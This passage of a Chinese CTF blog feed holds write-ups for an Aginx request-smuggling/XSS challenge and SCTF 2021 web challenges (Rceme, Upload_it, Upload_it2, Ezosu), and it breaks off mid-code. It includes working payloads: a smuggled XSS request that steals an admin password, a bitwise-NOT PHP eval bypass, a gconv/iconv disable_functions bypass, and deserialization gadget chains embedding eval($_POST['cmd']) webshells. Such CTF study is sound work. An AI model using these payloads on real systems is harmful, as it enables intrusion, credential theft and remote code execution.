以造成了请求走私。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/v4WPbblaISwL</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>a<br><br>POST /v/articles/preview HTTP/2<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>39.105.13.40:30443<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>921<br>title=&#123;&quot;data&quot;:&#123;&quot;_id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;2&quot;,&quot;author&quot;:&quot;3&quot;,&quot;htmlContent&quot;:&quot;&amp;content=&lt;img src=&#x27;test&#x27; onerror=&#x27;var xhttp1 = new XMLHttpRequest();xhttp1.open(\&quot;POST\&quot;, \&quot;/v/articles\&quot;, true);xhttp1.setRequestHeader(\&quot;Content-Type\&quot;,\&quot;application/json\&quot;);xhttp1.setRequestHeader(\&quot;Authorization\&quot;,\&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MzUwMTgxODYsInVzZXJuYW1lIjoiblZtU1N0UHpJU1E5In0.Z8kRojnNNNd6-g7Il3BPzvuGdVz-UtqaQzjWPsC1FMw\&quot;);xhttp1.send(JSON.stringify(&#123;\&quot;title\&quot;:\&quot;here_is_pwd\&quot;,\&quot;content\&quot;:document.getElementById(\&quot;app\&quot;).__vue__.$children[2]._data.form.password,\&quot;tags\&quot;:[],\&quot;is_public\&quot;:false&#125;));&#x27;&gt;&quot;,&quot;submissionTime&quot;:4,&quot;tags&quot;:&quot;5&quot;&#125;,&quot;status&quot;:0&#125;<br></code></pre></div></td></tr></table></figure><p>多发送几次请求之后就能看到通过go模板返回了<code>title</code>和<code>content</code>的内容。再访问这个url就行下载到那个静态文件了</p><p><img src="https://img-blog.csdnimg.cn/5568c150eb374ae3bcb5f01e13d360c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>查看日志能发现，发送了两个请求</p><p><img src="https://img-blog.csdnimg.cn/ee1811ddef0e458f8678305bcd67f4c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220201165919306.png" alt="image-20220201165919306"></p><p>下面就是要让bot来访问你的缓存文件，执行html中的代码造成xss。这里需要将url进行二次编码，因为会转发两次</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">..%252F..%252Fstatic%2Fkkfine%2520HTTP%252F1.1%250D%250AConnection:%2520keep-alive%250D%250AHost:%2520a%250D%250A%250D%250APOST%2520%252Fv%252Farticles%252Fpreview<br></code></pre></div></td></tr></table></figure><p>查看日志</p><p><img src="https://img-blog.csdnimg.cn/41db3f167d884ea7b57864ece6a0f393.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里的请求表明成功触发了xss代码，回显中的<code>title</code>和<code>content</code>便能看出密码。这里是不会发送到后端的，因为能直接获取到静态文件。这个做法就是和<code>impakho</code>大佬写的一样了。</p><p><img src="https://img-blog.csdnimg.cn/2cb0521d1f0d47f49b71debdeaae9ce2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>再看到官方wp时发现还有更简单的做法。因为大佬的最终攻击方法是先获取到admin用户的密码，然后登录admin账户提取<code>Authorization</code>认证，再用这个认证去获取flag，然后将返回内容发送到自己账户文章上。但官方wp还说到了另一种简思路，就是这里并不需要去偷admin的密码。两种做法的原因在于出题人的想法最后还考到了一个跳转时也可进行请求走私，所以可以直接将flag注入到缓存里面，我们便可以直接访问，也不需要触发xss，当然这只是一个非预期。</p><p>先按上面的方法向<code>/static/kkfine.json</code>中写入东西，然后直接向bot发送id（其实也可以直接向bot发送两次id）</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">..%25252f..%25252fstatic%252fkkfine.json%2520HTTP%252f1.1%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%2520%252fflag<br></code></pre></div></td></tr></table></figure><p>可以发现经过两次解码这里存在一个301跳转，并且走私了一个/flag请求，然而在301再次请求时，上个请求已经被缓存了，所以这里不会再经过web端了，flag就直接被储存到了缓存文件里。</p><p><img src="https://img-blog.csdnimg.cn/42308bac7f3e422c8c9fb607b155ca56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/92e880cd4e82458bb3d8f77bf3ecdd8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>之后直接请求我们的缓存文件</p><p><img src="https://img-blog.csdnimg.cn/2cc8660eb37d4d3291a8320244ae5419.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在复现这个题的时候，当同时有多个请求时的缓存问题让我对网络中各种请求和跳转的理解更深了。</p><h1 id="Aginx2"><a href="#Aginx2" class="headerlink" title="Aginx2"></a>Aginx2</h1><h1 id="Nothing"><a href="#Nothing" class="headerlink" title="Nothing"></a>Nothing</h1>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF复现</title>
    <link href="/2022/01/18/2022-1-18-SCTF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/01/18/2022-1-18-SCTF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>当时那段时间一直在复习就没怎么打比赛，现在放假终于是有时间来复现一些题目，学新的东西了。</p><h1 id="Rceme"><a href="#Rceme" class="headerlink" title="Rceme"></a>Rceme</h1><p>参考的一些文章</p><p><a href="http://naman.club/index.php/2022/01/11/sctf2021-web/">http://naman.club/index.php/2022/01/11/sctf2021-web/</a></p><p><a href="https://eastjun.top/2021/10/20/bypass_disable_function/">https://eastjun.top/2021/10/20/bypass_disable_function/</a></p><p><a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p><p>源码直接给出来了，看到<code>eval</code>应该要执行命令，但有过滤。<code>preg_match</code>先是过滤了一堆可用得字符，异或，字母，数字等都被过滤了。学习了下wp发现是可以利用取反来构造需要得函数，这是第一步。但进入界面还能看到<code>disable_functions</code>基本上全都被禁用了，所以后面还需要绕过<code>disable_functions</code>才行。</p><p>首先看第一个过滤<code>preg_match</code>，基本过滤了字符数字，还有一些符号等。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">preg_match(<span class="hljs-string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure><p>第二个正则是一个递归正则（递归正则可以看看<a href="https://www.cnblogs.com/f-ck-need-u/p/11344531.html%EF%BC%89%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E9%80%92%E5%BD%92%E6%AD%A3%E5%88%99%E6%9C%89%E4%B8%A4%E7%A7%8D%E5%8C%B9%E9%85%8D%E6%96%B9%E5%BC%8F%EF%BC%8C">https://www.cnblogs.com/f-ck-need-u/p/11344531.html），这里的递归正则有两种匹配方式，</a></p><p>第一种类似于这种<code>code=[~%00]([~%00]());</code>是在递归匹配<code>(?R)?</code>中的？选择进行了1次，第二种类似于<code>code=[~%00]();</code>是在递归匹配<code>(?R)?</code>中的？选择进行了0次。当然这里也替换掉了除<code>\s ()</code>外的东西。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$code</span>)<br></code></pre></div></td></tr></table></figure><p>不管是异或，取反，或，就是利用一些非字符数字单双引号等这些有用可见的其他字符，通过数学操作能够转换成另一种等价的表现形式，但是这种形式的值对应一些有用的字符。例如说异或</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br><span class="hljs-comment">// $&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></div></td></tr></table></figure><p>取反就更简单，例如</p><p><img src="https://img-blog.csdnimg.cn/44e4ded69f404a3796c83dfe2dc1c859.png" alt="在这里插入图片描述"></p><p>学习完一些东西，就开始做题。这里用取反构造一条链子<code>create_function(...unserialize(end(getallheaders)))</code> 其中<code>...</code>是利用可变长度参数来传参.</p><p>写个脚本构造payload,<code>!%FF</code>就是0，<code>~%CF</code>也可以</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, quote<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOT_chain</span>(<span class="hljs-params">chain</span>):</span><br>    j = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> chain:<br>        j += <span class="hljs-string">&quot;%&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span> - <span class="hljs-built_in">ord</span>(i)))[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> j<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_chain</span>(<span class="hljs-params">chains</span>):</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> chain <span class="hljs-keyword">in</span> chains:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;%d1%d1%d1&quot;</span> <span class="hljs-keyword">in</span> NOT_chain(chain):<br>            result += <span class="hljs-string">&quot;...[~&quot;</span> + NOT_chain(chain).replace(<span class="hljs-string">&quot;%d1%d1%d1&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)  + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result += <span class="hljs-string">&quot;[~&quot;</span> + NOT_chain(chain) + <span class="hljs-string">&quot;][!%FF](&quot;</span><br>    result = result +<span class="hljs-string">&quot;))));&quot;</span><br>    <span class="hljs-keyword">return</span>  result<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">input</span> = <span class="hljs-string">&quot;call_user_func(...unserialize(end(getallheaders)))&quot;</span><br>    chains = <span class="hljs-built_in">input</span>.strip(<span class="hljs-string">&#x27;)&#x27;</span>).split(<span class="hljs-string">&#x27;(&#x27;</span>)<br>    <span class="hljs-comment"># print(make_chain(chains))</span><br>    <span class="hljs-comment">#[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));</span><br></code></pre></div></td></tr></table></figure><p>抓包发送请求</p><p><img src="https://img-blog.csdnimg.cn/7e315a20ab4a426aa72b4861543342de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第二部分就是利用原生类写文件，<code>iconv</code>方bypass式绕过函数限制，原理网上也很多</p><p>可以利用<code>FilesystemIterator</code>类读文件，根目录不可读</p><p><img src="https://img-blog.csdnimg.cn/17a61ba0f4ce42b7b087815be33ffe9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>接着开始绕过disable_function，利用<code>SplFileObject</code>写文件，一些post内容</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http">cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=$file = new SplFileObject(&quot;/tmp/gconv-modules&quot;, &#x27;w+&#x27;);$file-&gt;fwrite(&quot;module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2<br>module  INTERNAL    EXP//    ../../../../../../../../tmp/exp    2&quot;);<br><br><br>写入so文件时也就是用伪协议传base64解码太长了不贴了。<br><br>#触发<br>cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&amp;11=putenv(&quot;GCONV_PATH=/tmp/&quot;);$c=new SplFileObject(&#x27;php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==&#x27;);show_source(&quot;/tmp/flag&quot;);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/fc967ed38b6d420490442f1b8ee96681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>关于一些绕过还有很多方式</p><p><a href="https://www.hetianlab.com/specialized/20201124173456">https://www.hetianlab.com/specialized/20201124173456</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p><h1 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload_it"></a>Upload_it</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>审计一下<code>index.php</code>可以发现<code>      $upload_file_path = $_SESSION[&quot;upload_path&quot;].&quot;/&quot;.$_POST[&#39;path&#39;];</code>进行了字符串拼接，并且这里的<code>$_SESSION[&quot;upload_path&quot;]</code>是可控的，所以联想到触发<code>toString()</code>函数，全局搜索一下发现可利用点</p><p><img src="https://img-blog.csdnimg.cn/0df57b5f05144b7e8f9aff06a55720fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>写exp：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br><span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br><span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;../vendor/opis/closure/autoload.php&quot;</span>;<br><span class="hljs-variable">$x</span> = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;;<br><span class="hljs-variable">$x</span> = \Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$x</span>);<br><span class="hljs-keyword">$this</span>-&gt;value = unserialize(<span class="hljs-variable">$x</span>);<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> \<span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>\<span class="hljs-title">LazyString</span>();<br><span class="hljs-variable">$s</span> = session_start();<br><span class="hljs-keyword">echo</span> session_id();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>上传本地运行后获取的session文件，覆盖服务器上的session文件</p><p><img src="https://img-blog.csdnimg.cn/3b1ebf40dffa49efb1dbe5a1b80d5ddb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>再次访问时，会读取我们覆盖的session文件，并且触发发序列化，因为session文件序列化写进去，一定会反序列化读出来的。然后即可执行命令</p><p><img src="https://img-blog.csdnimg.cn/3c3a8f69c24345a5bf56e2d6960d146f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="天枢的非预期"><a href="#天枢的非预期" class="headerlink" title="天枢的非预期"></a>天枢的非预期</h2><p>这个非预期真是太细了，<code>Sndav</code>👴真是太牛了。拿这个exp动调了一下，开始没看懂什么意思。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$closure</span>;<br></code></pre></div></td></tr></table></figure><p>可以看到走到<code>$_SESSION[&#39;a&#39;] = $closure;</code>时调用<code>serialize</code>函数，其中有一个<code>&#39;function&#39;</code>键</p><p><img src="https://img-blog.csdnimg.cn/527f4004ca614f49ba3aa2c16f2b0b16.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>我们需要将源码改为</p><p><img src="https://img-blog.csdnimg.cn/865b8019af5f441d9087dafbb4dc40a4.png" alt="在这里插入图片描述"></p><p>然后该下exp再动调</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;../vendor/autoload.php&quot;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Opis</span>\<span class="hljs-title">Closure</span>\<span class="hljs-title">SerializableClosure</span>;<br>session_start();<br><span class="hljs-variable">$closure</span> = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">123123</span>;<br>&#125;;<br><span class="hljs-comment">// phpinfo();</span><br><span class="hljs-variable">$closure</span> = <span class="hljs-keyword">new</span> SerializableClosure(<span class="hljs-variable">$closure</span>);<br><span class="hljs-variable">$x</span> = Opis\<span class="hljs-built_in">Closure</span>\serialize(<span class="hljs-variable">$closure</span>);<br>unserialize(<span class="hljs-variable">$x</span>);<br></code></pre></div></td></tr></table></figure><p>当走到<code> $data = \serialize($data);</code>这一步时，就是返回上面说的<code>$ret</code>变量</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220117001609023.png" alt="image-20220117001609023"></p><p>这时可以发现它序列化后的数据中间有我们的执行函数了。</p><p><img src="https://img-blog.csdnimg.cn/23d425bf8b65455da0a86474682fddf8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在<code>unserialize</code>中，走到这一步就会执行命令</p><p><img src="https://img-blog.csdnimg.cn/cb667aad79404c1ead4b75bc1ee904c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>后面的做法也是覆盖原session文件</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解感觉…怎么说呢不太能理解，不知道这个序列化的地方在哪，需要传什么上去。要是覆盖session的话，那也是触发反序列化，还是说后面还会再学序列化。exp也没看懂最后b64一下是在干啥。</p><h1 id="Upload-it2"><a href="#Upload-it2" class="headerlink" title="Upload_it2"></a>Upload_it2</h1><p>和上面差不多。这里用<code>[$san, &#39;backdoor&#39;]()</code>调用了函数。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span> &#123;<br><span class="hljs-title">class</span> <span class="hljs-title">LazyString</span> &#123;<br><span class="hljs-title">private</span> $<span class="hljs-title">value</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;value = <span class="hljs-variable">$x</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br>// <span class="hljs-title">use</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">String</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sandbox</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;evil = <span class="hljs-variable">$x</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$san</span> = <span class="hljs-keyword">new</span> sandbox(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Symfony\Component\<span class="hljs-keyword">String</span>\LazyString([<span class="hljs-variable">$san</span>, <span class="hljs-string">&#x27;backdoor&#x27;</span>]);<br>session_start();<br><span class="hljs-keyword">echo</span> session_id();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;upload_path&#x27;</span>] = <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Ezosu"><a href="#Ezosu" class="headerlink" title="Ezosu"></a>Ezosu</h1><p>题目给了附件是能够在本地搭环境的，将docker里面文件打包出来审计。关键的函数，简单的以<code>|</code>为分割键名和键值，所以这里我们在键名里面插入恶意反序列数据，就能造成逃逸。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 